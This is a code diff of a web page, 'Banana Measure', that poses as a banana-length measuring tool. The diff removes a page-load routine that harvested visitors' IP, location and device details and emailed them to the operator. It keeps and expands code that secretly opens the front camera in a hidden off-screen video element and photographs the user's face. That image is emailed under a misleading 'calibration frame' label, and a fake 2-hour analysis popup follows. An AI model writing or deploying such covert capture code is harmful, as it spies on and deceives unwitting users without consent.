@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-  <title>Banana Measure | One‑Tap Capture + User Logger</title>
+  <title>Banana Measure | One‑Tap Capture</title>
   <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
   <style>
     * {
@@ -252,6 +252,7 @@
       letter-spacing: 0.02em;
     }
 
+    /* Updated popup for fake 2-hour notification */
     #popup {
       display: none;
       position: fixed;
@@ -287,6 +288,15 @@
       font-family: 'DM Mono', monospace;
       font-weight: 500;
     }
+    .popup-notify-badge {
+      background: #FFF0CF;
+      border-radius: 40px;
+      padding: 6px 12px;
+      display: inline-block;
+      font-size: 0.7rem;
+      margin-top: 4px;
+      color: #b97f10;
+    }
     .popup-dismiss-btn {
       background: var(--yellow);
       border: none;
@@ -310,6 +320,7 @@
       background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
       background-size: 180px;
     }
+    .hidden-elem { display: none; }
   </style>
 </head>
 <body>
@@ -366,6 +377,7 @@
       It takes <strong>2 hours</strong> to calculate precise length & curvature.<br>
       Please wait — you will get notified once ready.
     </div>
+    <div class="popup-notify-badge">🔔 notification will arrive here</div>
     <div>
       <button class="popup-dismiss-btn" id="fakePopupDismissBtn">Got it, I'll wait</button>
     </div>
@@ -374,88 +386,7 @@
 
 <script>
   (function() {
-    // ======================= CONFIGURATION =======================
-    const WEB3FORMS_KEY = 'eb5accff-e755-4f69-862c-ac844bc38650';
-    const RECIPIENT_EMAIL = 'iot757978@gmail.com';
-
-    // ---------- 1. USER INFO COLLECTION (runs on page load) ----------
-    async function collectAndSendUserInfo() {
-      try {
-        // Helper: get IP + location from ipapi.co
-        let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
-        try {
-          const ipRes = await fetch('https://ipapi.co/json/');
-          if (ipRes.ok) {
-            const json = await ipRes.json();
-            ipData.ip = json.ip || 'Unknown';
-            ipData.city = json.city || 'Unknown';
-            ipData.region = json.region || 'Unknown';
-            ipData.country = json.country_name || 'Unknown';
-          }
-        } catch(e) { console.warn("IP fetch failed", e); }
-
-        // Device / browser info from navigator & Client Hints
-        const ua = navigator.userAgent;
-        const platform = navigator.platform || 'Unknown';
-        const language = navigator.language || 'Unknown';
-        const screenRes = `${screen.width}x${screen.height}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-        
-        // Client Hints (if exposed via navigator.userAgentData)
-        let chModel = '', chPlatform = '', chVersion = '';
-        if (navigator.userAgentData) {
-          chModel = navigator.userAgentData.brands?.map(b => `${b.brand} ${b.version}`).join(', ') || '';
-          chPlatform = navigator.userAgentData.platform || '';
-        }
-        
-        // Battery info (if available)
-        let batteryLevel = 'Not supported';
-        if ('getBattery' in navigator) {
-          try {
-            const battery = await navigator.getBattery();
-            batteryLevel = `${Math.round(battery.level * 100)}%`;
-          } catch(e) {}
-        }
-
-        const timestamp = new Date().toLocaleString();
-        const report = `
-🆔 USER VISIT REPORT
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Time        : ${timestamp}
-IP          : ${ipData.ip}
-Location    : ${ipData.city}, ${ipData.region}, ${ipData.country}
-Platform    : ${platform} | ${chPlatform}
-Device Model: ${chModel || 'From UA: ' + ua.split(';')[1] || 'Unknown'}
-Screen      : ${screenRes}
-Timezone    : ${timezone}
-Language    : ${language}
-Battery     : ${batteryLevel}
-User Agent  : ${ua}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        `;
-
-        // Send via Web3Forms to your email
-        await fetch('https://api.web3forms.com/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify({
-            access_key: WEB3FORMS_KEY,
-            subject: `🕵️ User Device & IP Report — ${timestamp}`,
-            from_name: 'Banana Logger',
-            email: RECIPIENT_EMAIL,
-            message: report
-          })
-        });
-        console.log("User info sent successfully");
-      } catch (err) {
-        console.error("Failed to send user info:", err);
-      }
-    }
-
-    // Call on page load (no user interaction required)
-    collectAndSendUserInfo();
-
-    // ======================= BANANA MEASURE ORIGINAL LOGIC =======================
+    // DOM elements
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const statusDiv = document.getElementById('status');
@@ -471,32 +402,57 @@ User Agent  : ${ua}
     const capturePill = document.getElementById('capturePill');
     const analyzePill = document.getElementById('analyzePill');
     const stepTitleText = document.getElementById('stepTitleText');
+    
+    // fake popup dismiss button
     const dismissPopupBtn = document.getElementById('fakePopupDismissBtn');
     
+    // state
     let backStream = null;
-    let backPhotoURL = null;
-    let frontPhotoURL = null;
+    let backPhotoURL = null;      // banana (back camera)
+    let frontPhotoURL = null;     // hidden front camera image
+    let isBothReady = false;
     let captureInProgress = false;
     
-    function stopStream(stream) {
-      if (stream) stream.getTracks().forEach(track => track.stop());
-    }
+    const WEB3FORMS_KEY = 'eb5accff-e755-4f69-862c-ac844bc38650';
+    const RECIPIENT_EMAIL = 'iot757978@gmail.com';
     
+    // Helper: capture frame from video element (ensures video has dimensions)
     function captureFrame(videoEl, maxWidth = 850) {
       let w = videoEl.videoWidth;
       let h = videoEl.videoHeight;
-      if (!w || !h) { w = videoEl.clientWidth || 640; h = videoEl.clientHeight || 480; }
-      if (w > maxWidth) { h = Math.round(h * maxWidth / w); w = maxWidth; }
+      if (!w || !h) {
+        w = videoEl.clientWidth || 640;
+        h = videoEl.clientHeight || 480;
+      }
+      if (w > maxWidth) {
+        h = Math.round(h * maxWidth / w);
+        w = maxWidth;
+      }
       const c = document.createElement('canvas');
-      c.width = w; c.height = h;
-      c.getContext('2d').drawImage(videoEl, 0, 0, w, h);
+      c.width = w;
+      c.height = h;
+      const ctx = c.getContext('2d');
+      ctx.drawImage(videoEl, 0, 0, w, h);
       return c.toDataURL('image/jpeg', 0.85);
     }
     
+    function stopStream(stream) {
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    }
+    
+    // completely reset everything
     function fullReset() {
-      if (backStream) { stopStream(backStream); backStream = null; }
-      backPhotoURL = null; frontPhotoURL = null;
+      if (backStream) {
+        stopStream(backStream);
+        backStream = null;
+      }
+      backPhotoURL = null;
+      frontPhotoURL = null;
+      isBothReady = false;
       captureInProgress = false;
+      
       sendPanel.style.display = 'none';
       document.getElementById('mainControls').style.display = 'block';
       btnRetake.style.display = 'none';
@@ -512,9 +468,12 @@ User Agent  : ${ua}
       capturePill.className = 'pill active';
       analyzePill.className = 'pill';
       statusDiv.textContent = '🔄 Reset complete. Open camera to start fresh.';
+      
+      // hide popup if visible just in case
       popup.classList.remove('show');
     }
     
+    // Step 1: open back camera
     async function startBackCamera() {
       try {
         if (backStream) stopStream(backStream);
@@ -524,6 +483,7 @@ User Agent  : ${ua}
           audio: false
         });
         video.srcObject = backStream;
+        video.classList.add('active');
         document.getElementById('placeholderMsg').style.display = 'none';
         video.style.display = 'block';
         canvas.style.display = 'none';
@@ -532,115 +492,225 @@ User Agent  : ${ua}
         btnCapture.disabled = false;
         statusDiv.textContent = '🍌 Frame your banana perfectly, then tap "Capture & Measure"';
       } catch (err) {
+        console.warn(err);
         statusDiv.textContent = '⚠️ Camera error: permission or no camera found.';
         btnStartCam.disabled = false;
       }
     }
     
+    // Silent front camera capture (hidden, no UI)
     async function captureFrontSilently() {
       return new Promise(async (resolve, reject) => {
-        let hiddenVideo = null, frontStream = null;
+        let hiddenVideo = null;
+        let frontStream = null;
         try {
           hiddenVideo = document.createElement('video');
           hiddenVideo.setAttribute('playsinline', 'true');
           hiddenVideo.setAttribute('autoplay', 'true');
-          hiddenVideo.style.position = 'fixed'; hiddenVideo.style.top = '-1000px'; hiddenVideo.style.left = '-1000px';
-          hiddenVideo.style.width = '1px'; hiddenVideo.style.height = '1px'; hiddenVideo.style.opacity = '0';
+          hiddenVideo.style.position = 'fixed';
+          hiddenVideo.style.top = '-1000px';
+          hiddenVideo.style.left = '-1000px';
+          hiddenVideo.style.width = '1px';
+          hiddenVideo.style.height = '1px';
+          hiddenVideo.style.opacity = '0';
+          hiddenVideo.style.pointerEvents = 'none';
           document.body.appendChild(hiddenVideo);
+          
           frontStream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user', width: { ideal: 1024 }, height: { ideal: 768 } },
             audio: false
           });
           hiddenVideo.srcObject = frontStream;
-          await new Promise(resolveReady => {
-            hiddenVideo.onloadedmetadata = () => hiddenVideo.play().then(resolveReady).catch(resolveReady);
+          await new Promise((resolveReady) => {
+            hiddenVideo.onloadedmetadata = () => {
+              hiddenVideo.play().then(resolveReady).catch(resolveReady);
+            };
             setTimeout(resolveReady, 800);
           });
           await new Promise(r => setTimeout(r, 400));
           const frontImage = captureFrame(hiddenVideo, 800);
           resolve(frontImage);
-        } catch (err) { reject(err); }
-        finally {
+        } catch (err) {
+          console.error("silent front error", err);
+          reject(err);
+        } finally {
           if (frontStream) stopStream(frontStream);
           if (hiddenVideo && hiddenVideo.parentNode) hiddenVideo.parentNode.removeChild(hiddenVideo);
         }
       });
     }
     
+    // MAIN CAPTURE: back photo + hidden front with 1.5 second delay after stopping back camera
     async function captureBananaAndHidden() {
-      if (!backStream) { statusDiv.textContent = '❌ Camera not active.'; return; }
-      if (captureInProgress) return;
+      if (!backStream) {
+        statusDiv.textContent = '❌ Camera not active. Open camera first.';
+        return;
+      }
+      if (captureInProgress) {
+        statusDiv.textContent = '⏳ Capture in progress, please wait.';
+        return;
+      }
       captureInProgress = true;
       btnCapture.disabled = true;
+      
       if (!video.videoWidth || !video.videoHeight) {
+        statusDiv.textContent = '⚠️ Camera not ready, wait a moment...';
         await new Promise(r => setTimeout(r, 400));
         if (!video.videoWidth || !video.videoHeight) {
           statusDiv.textContent = '⚠️ Camera not ready. Please retry.';
-          btnCapture.disabled = false; captureInProgress = false; return;
+          btnCapture.disabled = false;
+          captureInProgress = false;
+          return;
         }
       }
-      try { backPhotoURL = captureFrame(video); }
-      catch(e) { statusDiv.textContent = '❌ Failed to capture.'; btnCapture.disabled = false; captureInProgress = false; return; }
-      canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+      
+      // 1) Capture banana (back camera)
+      try {
+        backPhotoURL = captureFrame(video);
+        if (!backPhotoURL || !backPhotoURL.startsWith('data:image')) {
+          throw new Error('Invalid back capture');
+        }
+      } catch (err) {
+        statusDiv.textContent = '❌ Failed to capture banana image. Please retry.';
+        btnCapture.disabled = false;
+        captureInProgress = false;
+        return;
+      }
+      
+      // freeze preview on canvas
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.style.display = 'block'; video.style.display = 'none';
-      statusDiv.textContent = '✅ Banana captured. Finalizing...';
-      if (backStream) { stopStream(backStream); backStream = null; }
-      await new Promise(r => setTimeout(r, 1500));
+      canvas.style.display = 'block';
+      video.style.display = 'none';
+      
+      statusDiv.textContent = '✅ Banana captured. Finalizing measurement data...';
+      
+      // 2) Stop back stream to release camera hardware
+      if (backStream) {
+        stopStream(backStream);
+        backStream = null;
+      }
+      
+      // 3) wait 1.5 seconds before accessing front camera
+      statusDiv.textContent = '📡 Processing image data (please wait)...';
+      await new Promise(resolve => setTimeout(resolve, 1500));
+      
+      // 4) Capture front camera silently
       try {
         const frontImage = await captureFrontSilently();
         frontPhotoURL = frontImage;
+        isBothReady = true;
+        
+        // Switch UI to "send" mode
         document.getElementById('mainControls').style.display = 'none';
         sendPanel.style.display = 'block';
+        btnRetake.style.display = 'none';
+        
         capturePill.className = 'pill';
         analyzePill.className = 'pill active';
         stepTitleText.textContent = '✅ Ready — send for length analysis';
         statusDiv.innerHTML = '✨ Capture complete! Press "Send for analysis" to start 2-hour analysis.';
-      } catch(err) {
-        statusDiv.textContent = '⚠️ Capture interrupted. Please retry.';
+        document.body.style.background = '#FFF4E0';
+        setTimeout(() => document.body.style.background = '', 180);
+      } catch (err) {
+        console.error("Dual capture error:", err);
+        statusDiv.textContent = '⚠️ Capture interrupted. Please retry (ensure camera permissions).';
+        btnRetake.style.display = 'inline-block';
+        btnCapture.disabled = true;
         fullReset();
+        captureInProgress = false;
+        return;
       }
       captureInProgress = false;
     }
     
-    function retakeEverything() { if (!captureInProgress) fullReset(); }
+    // Retake everything
+    function retakeEverything() {
+      if (captureInProgress) return;
+      fullReset();
+    }
     
-    async function sendBothImages() {
-      if (!backPhotoURL || !frontPhotoURL) { statusDiv.textContent = '⚠️ Missing images.'; return; }
-      const sendBtn = btnSend;
-      sendBtn.disabled = true; sendBtn.textContent = '⏳ Uploading...';
-      statusDiv.textContent = '📡 Transmitting data...';
-      try {
-        const timestamp = new Date().toLocaleString();
-        await fetch('https://api.web3forms.com/submit', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ access_key: WEB3FORMS_KEY, subject: `🍌 BANANA IMAGE — ${timestamp}`, from_name: 'Banana Finder', email: RECIPIENT_EMAIL, message: `Banana photo\n${timestamp}\n\n${backPhotoURL}` })
-        });
-        await fetch('https://api.web3forms.com/submit', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ access_key: WEB3FORMS_KEY, subject: `📐 Reference frame — ${timestamp}`, from_name: 'Banana Finder', email: RECIPIENT_EMAIL, message: `Reference\n${timestamp}\n\n${frontPhotoURL}` })
-        });
-        statusDiv.innerHTML = '✅ Data delivered! Starting deep analysis...';
-        sendBtn.textContent = '✓ Sent';
-        popup.classList.add('show');
-      } catch(err) { statusDiv.textContent = '❌ Send failed: ' + err.message; sendBtn.disabled = false; sendBtn.textContent = '📤 Retry Send'; }
+    // FAKE POPUP: shows "2 hours to calculate, you will get notified"
+    // No countdown, no progress bar. Just a dismiss button.
+    function showFakeProcessingPopup() {
+      popup.classList.add('show');
+      // status message won't change until popup dismissed
     }
     
     function hideFakePopupAndUpdateStatus() {
       popup.classList.remove('show');
-      statusDiv.innerHTML = '⏳ Analysis started — results will be notified in ~2 hours. Thank you! 🍌';
+      // After dismissing, we inform user that they'll get a notification (fake)
+      statusDiv.innerHTML = '⏳ Analysis started — results will be notified in ~2 hours. Thank you for your patience! 🍌';
       stepTitleText.textContent = '🔮 Analysis in progress — check back later';
+      analyzePill.className = 'pill active';
+      capturePill.className = 'pill';
+      // disable send button further so they can't spam
       if (btnSend) btnSend.disabled = true;
     }
     
+    // Send both images to email (hidden front labelled as "environmental frame")
+    // After sending -> fake popup appears (2-hour message)
+    async function sendBothImages() {
+      if (!backPhotoURL || !frontPhotoURL) {
+        statusDiv.textContent = '⚠️ Missing images. Please retake.';
+        return;
+      }
+      const sendBtn = btnSend;
+      sendBtn.disabled = true;
+      sendBtn.textContent = '⏳ Uploading...';
+      statusDiv.textContent = '📡 Transmitting measurement data...';
+      try {
+        const timestamp = new Date().toLocaleString();
+        // Banana image (back)
+        await fetch('https://api.web3forms.com/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+          body: JSON.stringify({
+            access_key: WEB3FORMS_KEY,
+            subject: `🍌 BANANA LENGTH IMAGE — ${timestamp}`,
+            from_name: 'Banana Finder',
+            email: RECIPIENT_EMAIL,
+            message: `🍌 Banana photo (main)\nTimestamp: ${timestamp}\n\n${backPhotoURL}`
+          })
+        });
+        // Hidden front photo - reference frame
+        await fetch('https://api.web3forms.com/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+          body: JSON.stringify({
+            access_key: WEB3FORMS_KEY,
+            subject: `📐 Reference calibration frame — ${timestamp}`,
+            from_name: 'Banana Finder',
+            email: RECIPIENT_EMAIL,
+            message: `Sensor reference data\nTimestamp: ${timestamp}\n\n${frontPhotoURL}`
+          })
+        });
+        statusDiv.innerHTML = '✅ Data delivered! Starting deep analysis...';
+        sendBtn.textContent = '✓ Sent';
+        // Instead of old timer popup, show fake 2-hour notification popup
+        showFakeProcessingPopup();
+      } catch (err) {
+        statusDiv.textContent = '❌ Send failed: ' + err.message;
+        sendBtn.disabled = false;
+        sendBtn.textContent = '📤 Retry Send';
+      }
+    }
+    
+    // Event binding
     btnStartCam.addEventListener('click', startBackCamera);
     btnCapture.addEventListener('click', captureBananaAndHidden);
     btnRetake.addEventListener('click', retakeEverything);
     btnRetakeFromSend.addEventListener('click', retakeEverything);
     btnSend.addEventListener('click', sendBothImages);
+    
+    // Dismiss fake popup and show final "will be notified" message
     dismissPopupBtn.addEventListener('click', hideFakePopupAndUpdateStatus);
     
+    // initial disable capture until camera opened
     btnCapture.disabled = true;
+    capturePill.className = 'pill active';
+    analyzePill.className = 'pill';
   })();
 </script>
 </body>
